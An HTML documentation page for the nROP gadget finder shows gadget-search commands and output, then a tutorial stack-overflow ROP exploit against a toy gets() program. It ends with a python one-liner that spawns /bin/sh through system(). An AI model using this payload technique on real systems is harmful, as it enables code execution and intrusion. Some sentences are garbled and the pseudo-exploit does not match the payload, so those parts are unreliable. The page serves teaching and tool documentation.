<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>nROP Homepage</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <style>
      body {
        padding-top: 60px;
      }
    </style>
    <link href="http://aurelien.wail.ly/nrop/stylesheets/styles.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" type="text/css">
    <!--[if lt IE 9]>
      <script src="//html5shim.googlecode.com/svn/trunk/html5.js" type="text/javascript"></script>
    <![endif]-->
  </head>
  <body>
    <div class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="http://aurelien.wail.ly/nrop">nROP</a>
          <ul class="nav navbar-nav">
            <li>
              <a href="http://aurelien.wail.ly/nrop">Home</a>
            </li>
            <li>
              <li>
                <a href="http://aurelien.wail.ly/nrop/getstarted">Get Started</a>
              </li>
            </li>
            <li>
              <li>
                <a href="http://aurelien.wail.ly/nrop/download">Download</a>
              </li>
            </li>
            <li>
              <li>
                <a href="http://aurelien.wail.ly/nrop/doc">Documentation</a>
              </li>
            </li>
          </ul>
        </div>
      </div>
    </div>
    <div class="container">
      
      <h1 id="gather-gadgets">Gather gadgets</h1>
      
      <p>The simplest form of ga is two chains, as ROP chains, do the same thing.</p>
      
      <p>A sample binary containing <a href="https://media.blackhat.com/us-13/US-13-Quynh-OptiROP-Hunting-for-ROP-Gadgets-in-Style-Slides.pdf">optiROP</a> tricky chains is included in the <a href="https://github.com/awailly/nrop/tree/master/examples">examples directory of the github repository</a>. We will use this binary to underline different type of gadgets handled by nROP, and corresponding to the categories of gadgets identified by @aquynh.</p>
      
      <h2 id="natural-gadgets">Natural gadgets</h2>
      
      <h3 id="pn1">PN1</h3>
      
      <p>The first category of gadgets sets a register to another register.</p>
      
      <p>Command to launch:</p>
      
      <pre><code>% ./packer -t 4889d8c3 examples/opti&#x000A;</code></pre>
      
      <p>Results</p>
      
      <pre><code>   [X] add byte ptr [rax], al ; add byte ptr [rdi], cl ; add eax, 0xc3d88948 ; xchg rbx, rax ; ret  ;&#x000A;   [X] add byte ptr [rdi], cl ; add eax, 0xc3d88948 ; xchg rbx, rax ; ret  ;&#x000A;   [X] add eax, 0xc3d88948 ; xchg rbx, rax ; ret  ;&#x000A;   [X] fadd st0, st3 ; xchg rbx, rax ; ret  ;&#x000A;   [X] fadd st0, st3 ; xchg rcx, rbx ; xchg rcx, rax ; ret  ;&#x000A;   [X] fadd st0, st3 ; xor rax, rax ; not rax ; and rax, rbx ; ret  ;&#x000A;   [X] imul rax, rbx, 0x1 ; ret  ;&#x000A;   [X] mov rax, rbx ; ret  ;&#x000A;   [X] push rbx ; xor rax, rax ; pop rax ; ret  ;&#x000A;   [X] rcr byte ptr [rsi+0x48], 0x1 ; fadd st0, st3 ; xor rax, rax ; not rax ; and rax, rbx ; ret  ;&#x000A;   [X] ror byte ptr [rax+0x21], 0x1 ; fadd st0, st3 ; xchg rcx, rbx ; xchg rcx, rax ; ret  ;&#x000A;   [X] xchg rbx, rax ; ret  ;&#x000A;   [X] xchg rcx, rbx ; lea rax, ptr [rcx] ; ret  ;&#x000A;   [X] xchg rcx, rbx ; xchg rcx, rax ; ret  ;&#x000A;   [X] xor eax, eax ; add rax, rbx ; ret  ;&#x000A;   [X] xor eax, eax ; not rax ; and rax, rbx ; ret  ;&#x000A;   [X] xor rax, rax ; add rax, rbx ; ret  ;&#x000A;   [X] xor rax, rax ; not rax ; and rax, rbx ; ret  ;&#x000A;</code></pre>
      
      <h3 id="pn2">PN2</h3>
      
      <p>The second category of gadgets sets a register to an immediate constant.</p>
      
      <p>Command to launch:</p>
      
      <pre><code>% ./packer -t 48c7c034120000c3 examples/opti&#x000A;</code></pre>
      
      <p>Results</p>
      
      <pre><code>   [X] push 0x1234 ; pop rax ; inc rbx ; ret  ;&#x000A;   [X] push 0x1234 ; pop rbp ; xchg rbp, rax ; ret  ;&#x000A;   [X] push 0xffffffffffffedcc ; pop rdx ; xor rax, rax ; sub rax, rdx ; ret  ;&#x000A;</code></pre>
      
      <h3 id="stack-overflow-example">Stack overflow example</h3>
      
      <p>We take the first <a href="http://crypto.stanford.edu/~blynn/rop/">google result for "rop exploit"</a> and use nrop to exploit it. The vulnerable code for this example is</p>
      
      <pre><code>#include &lt;stdio.h&gt; &#x000A;&#x000A;int main()&#x000A;{&#x000A;    char name[64]; &#x000A;    printf("%p\n", name);  // Print address of buffer. &#x000A;    puts("What's your name?"); &#x000A;    gets(name); &#x000A;    printf("Hello, %s!\n", name); &#x000A;    return 0; &#x000A;}&#x000A;</code></pre>
      
      <p>Then we compile and load the binary into gdb with [peda][https://github.com/longld/peda].</p>
      
      <pre><code>% gcc bla.c -o bla&#x000A;% gdb -q --args bla&#x000A;Reading symbols from bla...(no debugging symbols found)...done.&#x000A;gdb-peda$ pattc 128 /tmp/bla&#x000A;Writing pattern of 128 chars to filename "/tmp/bla"&#x000A;gdb-peda$ r &lt; /tmp/bla&#x000A;Starting program: /tmp/tmp.mysQza1R1X/bla &lt; /tmp/bla&#x000A;0x7fffffffddb0&#x000A;What's your name?&#x000A;Hello, AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AA...&#x000A;&#x000A;Program received signal SIGSEGV, Segmentation fault.&#x000A;[----------------------------------registers-----------------------------------]&#x000A;RAX: 0x0 &#x000A;RBX: 0x0 &#x000A;RCX: 0x7fffff78 &#x000A;RDX: 0x7ffff7dd7970 --&gt; 0x0 &#x000A;RSI: 0x7ffff7ff7000 ("Hello, AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA...&#x000A;RDI: 0x0 &#x000A;RBP: 0x4141334141644141 ('AAdAA3AA')&#x000A;RSP: 0x7fffffffddf8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")&#x000A;RIP: 0x4005e6 (&lt;main+80&gt;:       ret)&#x000A;R8 : 0x6941414d41413741 ('A7AAMAAi')&#x000A;R9 : 0x80 &#x000A;R10: 0x414f41413941416a ('jAA9AAOA')&#x000A;R11: 0x246 &#x000A;R12: 0x4004a0 (&lt;_start&gt;:        xor    ebp,ebp)&#x000A;R13: 0x7fffffffded0 --&gt; 0x1 &#x000A;R14: 0x0 &#x000A;R15: 0x0&#x000A;EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)&#x000A;[-------------------------------------code-------------------------------------]&#x000A;   0x4005db &lt;main+69&gt;:  call   0x400460 &lt;printf@plt&gt;&#x000A;   0x4005e0 &lt;main+74&gt;:  mov    eax,0x0&#x000A;   0x4005e5 &lt;main+79&gt;:  leave  &#x000A;=&gt; 0x4005e6 &lt;main+80&gt;:  ret    &#x000A;   0x4005e7:    nop    WORD PTR [rax+rax*1+0x0]&#x000A;   0x4005f0 &lt;__libc_csu_init&gt;:  push   r15&#x000A;   0x4005f2 &lt;__libc_csu_init+2&gt;:        push   r14&#x000A;   0x4005f4 &lt;__libc_csu_init+4&gt;:        mov    r15d,edi&#x000A;[------------------------------------stack-------------------------------------]&#x000A;0000| 0x7fffffffddf8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")&#x000A;0008| 0x7fffffffde00 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")&#x000A;0016| 0x7fffffffde08 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")&#x000A;0024| 0x7fffffffde10 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")&#x000A;0032| 0x7fffffffde18 ("A7AAMAAiAA8AANAAjAA9AAOA")&#x000A;0040| 0x7fffffffde20 ("AA8AANAAjAA9AAOA")&#x000A;0048| 0x7fffffffde28 ("jAA9AAOA")&#x000A;0056| 0x7fffffffde30 --&gt; 0x400400 --&gt; 0x6009f0 --&gt; 0x7ffff7aa1940 (&lt;gets&gt;:      push   r12)&#x000A;[------------------------------------------------------------------------------]&#x000A;Legend: code, data, rodata, value&#x000A;Stopped reason: SIGSEGV&#x000A;0x00000000004005e6 in main ()&#x000A;</code></pre>
      
      <p>And we look for our pattern in memory</p>
      
      <pre><code>gdb-peda$ patts&#x000A;Registers contain pattern buffer:&#x000A;R8+0 found at offset: 104&#x000A;R10+0 found at offset: 120&#x000A;RBP+0 found at offset: 64&#x000A;Registers point to pattern buffer:&#x000A;[RSP] --&gt; offset 72 - size ~56&#x000A;Pattern buffer found at:&#x000A;0x00007ffff7ff6000 : offset    0 - size  128 (mapped)&#x000A;0x00007ffff7ff7007 : offset    0 - size  128 (mapped)&#x000A;0x00007fffffffdd18 : offset   88 - size    8 ($sp + -0xe0 [-56 dwords])&#x000A;0x00007fffffffddb0 : offset    0 - size  128 ($sp + -0x48 [-18 dwords])&#x000A;References to pattern buffer found at:&#x000A;0x00007ffff7dd5988 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)&#x000A;0x00007ffff7dd5990 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)&#x000A;0x00007ffff7dd5998 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)&#x000A;0x00007ffff7dd59a0 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)&#x000A;0x00007ffff7dd59a8 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)&#x000A;0x00007ffff7dd59b0 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)&#x000A;0x00007ffff7dd59b8 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)&#x000A;0x00007fffffffd870 : 0x00007fffffffddb0 ($sp + -0x588 [-354 dwords])&#x000A;0x00007fffffffdce0 : 0x00007fffffffddb0 ($sp + -0x118 [-70 dwords])&#x000A;0x00007fffffffdcf8 : 0x00007fffffffddb0 ($sp + -0x100 [-64 dwords])&#x000A;0x00007fffffffdd60 : 0x00007fffffffddb0 ($sp + -0x98 [-38 dwords])&#x000A;</code></pre>
      
      <p>The current memory layout is</p>
      
      <pre><code>gdb-peda$ vmmap&#x000A;Start              End                Perm      Name&#x000A;0x00400000         0x00401000         r-xp      /tmp/tmp.mysQza1R1X/bla&#x000A;0x00600000         0x00601000         rw-p      /tmp/tmp.mysQza1R1X/bla&#x000A;0x00007ffff7a38000 0x00007ffff7bd1000 r-xp      /usr/lib/libc-2.21.so&#x000A;0x00007ffff7bd1000 0x00007ffff7dd1000 ---p      /usr/lib/libc-2.21.so&#x000A;0x00007ffff7dd1000 0x00007ffff7dd5000 r--p      /usr/lib/libc-2.21.so&#x000A;0x00007ffff7dd5000 0x00007ffff7dd7000 rw-p      /usr/lib/libc-2.21.so&#x000A;0x00007ffff7dd7000 0x00007ffff7ddb000 rw-p      mapped&#x000A;0x00007ffff7ddb000 0x00007ffff7dfd000 r-xp      /usr/lib/ld-2.21.so&#x000A;0x00007ffff7fca000 0x00007ffff7fcd000 rw-p      mapped&#x000A;0x00007ffff7ff6000 0x00007ffff7ff8000 rw-p      mapped&#x000A;0x00007ffff7ff8000 0x00007ffff7ffa000 r--p      [vvar]&#x000A;0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]&#x000A;0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /usr/lib/ld-2.21.so&#x000A;0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /usr/lib/ld-2.21.so&#x000A;0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped&#x000A;0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]&#x000A;0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]&#x000A;</code></pre>
      
      <p>We will exploit with a conventional call to the system() function into libc with <em>/bin/sh</em> as the first argument, here into the <em>RDI</em> register. The target for our exploit is</p>
      
      <pre><code>rdi = &amp;"/bin/sh"&#x000A;rip = &amp;system@libc&#x000A;</code></pre>
      
      <p>The <em>/bin/sh</em> string can be written on the stack directly and the address pop'd. Our first guess is with the freshly created binary</p>
      
      <pre><code>% ~/Outils/nrop/nrop/packer -t 5fc3 /tmp/tmp.mysQza1R1X/bla&#x000A;Found Entry @4004a0&#x000A;000000: \x5f\xc3                                           _.&#x000A;000000: \xc3                                              .&#x000A;   [00400653] pop rdi ; ret  ;&#x000A;</code></pre>
      
      <p>Then we grab the system@libc address, by adjusting a got address with the offset of <em>system</em> in the libc (to somehow bypass ASLR)</p>
      
      <pre><code>gdb-peda$ p puts&#x000A;$1 = {&lt;text variable, no debug info&gt;} 0x7ffff7aa21e0 &lt;puts&gt;&#x000A;gdb-peda$ p system&#x000A;$2 = {&lt;text variable, no debug info&gt;} 0x7ffff7a777e0 &lt;system&gt;&#x000A;gdb-peda$ p $1 - $2&#x000A;$3 = 0x2aa00&#x000A;</code></pre>
      
      <p>We want to write <em>&amp;system</em> at <em>0x6009d0</em> and set eip to <em>0x400450</em></p>
      
      <pre><code>gdb-peda$ disassemble &#x000A;Dump of assembler code for function main:&#x000A;   0x0000000000400596 &lt;+0&gt;:     push   rbp&#x000A;   0x0000000000400597 &lt;+1&gt;:     mov    rbp,rsp&#x000A;   0x000000000040059a &lt;+4&gt;:     sub    rsp,0x40&#x000A;   0x000000000040059e &lt;+8&gt;:     lea    rax,[rbp-0x40]&#x000A;   0x00000000004005a2 &lt;+12&gt;:    mov    rsi,rax&#x000A;   0x00000000004005a5 &lt;+15&gt;:    mov    edi,0x400674&#x000A;   0x00000000004005aa &lt;+20&gt;:    mov    eax,0x0&#x000A;   0x00000000004005af &lt;+25&gt;:    call   0x400460 &lt;printf@plt&gt;&#x000A;   0x00000000004005b4 &lt;+30&gt;:    mov    edi,0x400678&#x000A;   0x00000000004005b9 &lt;+35&gt;:    call   0x400450 &lt;puts@plt&gt;&#x000A;   0x00000000004005be &lt;+40&gt;:    lea    rax,[rbp-0x40]&#x000A;   0x00000000004005c2 &lt;+44&gt;:    mov    rdi,rax&#x000A;   0x00000000004005c5 &lt;+47&gt;:    call   0x400490 &lt;gets@plt&gt;&#x000A;   0x00000000004005ca &lt;+52&gt;:    lea    rax,[rbp-0x40]&#x000A;   0x00000000004005ce &lt;+56&gt;:    mov    rsi,rax&#x000A;   0x00000000004005d1 &lt;+59&gt;:    mov    edi,0x40068a&#x000A;   0x00000000004005d6 &lt;+64&gt;:    mov    eax,0x0&#x000A;   0x00000000004005db &lt;+69&gt;:    call   0x400460 &lt;printf@plt&gt;&#x000A;   0x00000000004005e0 &lt;+74&gt;:    mov    eax,0x0&#x000A;   0x00000000004005e5 &lt;+79&gt;:    leave  &#x000A;=&gt; 0x00000000004005e6 &lt;+80&gt;:    ret    &#x000A;End of assembler dump.&#x000A;gdb-peda$ disassemble 0x400450&#x000A;Dump of assembler code for function puts@plt:&#x000A;   0x0000000000400450 &lt;+0&gt;:     jmp    QWORD PTR [rip+0x20057a]        # 0x6009d0 &lt;puts@got.plt&gt;&#x000A;   0x0000000000400456 &lt;+6&gt;:     push   0x0&#x000A;   0x000000000040045b &lt;+11&gt;:    jmp    0x400440&#x000A;End of assembler dump.&#x000A;gdb-peda$ disassemble 0x6009d0&#x000A;Dump of assembler code for function puts@got.plt:&#x000A;   0x00000000006009d0 &lt;+0&gt;:     loopne 0x6009f3 &lt;gets@got.plt+3&gt;&#x000A;   0x00000000006009d2 &lt;+2&gt;:     stos   BYTE PTR es:[rdi],al&#x000A;   0x00000000006009d3 &lt;+3&gt;:     idiv   edi&#x000A;   0x00000000006009d5 &lt;+5&gt;:     jg     0x6009d7 &lt;puts@got.plt+7&gt;&#x000A;   0x00000000006009d7 &lt;+7&gt;:     add    BYTE PTR [rax-0x85790],ah&#x000A;End of assembler dump.&#x000A;gdb-peda$ x/xg 0x6009d0&#x000A;0x6009d0 &lt;puts@got.plt&gt;:        0x00007ffff7aa21e0&#x000A;</code></pre>
      
      <p>Our exploit is in the pseudo form</p>
      
      <pre><code>"A"*72 + pop rdi + "/bin/sh" + ([0x6009d0] += 0x2aa00) + ret(0x400450&#x000A;</code></pre>
      
      <p>Weaponized in python with</p>
      
      <pre><code>python2 -c 'print "A"*72 + "\x53\x06\x40\x00\x00\x00\x00\x00" + "hs//bin/" + "\xe0\x77\xa7\xf7\xff\x7f\x00\x00"' &gt; /tmp/bla&#x000A;gdb -q ./bla&#x000A;</code></pre>
      
      <h2 id="chained-gadgets">Chained gadgets</h2>
      
      <p>Support coming :)</p>
      
      <h3 id="pc1">PC1</h3>
      
      <p>This category of gadgets is close to PN1, setting register to another, but with the help of gadget chaining.</p>
      
      <h3 id="pc2">PC2</h3>
      
      <p>This category of gadgets is close to PN2, setting register to another, but with the help of gadget chaining.</p>
      
      <h3 id="pc3">PC3</h3>
      
      <p>This category of gadgets is close to PN3, setting register to another, but with the help of gadget chaining.</p>
      <hr>
      <footer>
        <p>&copy; NoName 2015</p>
      </footer>
    </div>
  </body>
</html>
